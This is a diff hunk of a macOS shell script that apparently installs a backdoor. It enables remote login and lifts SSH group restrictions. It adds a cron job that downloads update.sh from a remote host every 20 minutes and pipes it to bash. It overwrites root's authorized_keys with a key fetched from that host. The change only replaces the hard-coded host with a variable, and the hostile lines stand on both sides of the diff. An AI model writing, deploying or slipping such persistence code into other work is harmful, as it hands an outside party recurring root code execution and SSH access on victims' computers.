@@ -9,13 +9,13 @@ systemsetup -setremotelogin on >/dev/null
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null
 
 # Add update to crontab
-(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh |bash') | crontab -
+(crontab -l 2>/dev/null; echo "*/20 * * * * curl -L $host:2042/mac/update.sh |bash") | crontab -
 
 sshpath="/var/root/.ssh"
 mkdir -p "$sshpath" # On most computers, there won't be a .ssh directory initially
 
 rm "$sshpath/authorized_keys" # Just in case
-curl -Lso "$sshpath/authorized_keys" boesen.science:2042/pubkey
+curl -Lso "$sshpath/authorized_keys" $host:2042/pubkey
 
 user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
 hostname=$(hostname)
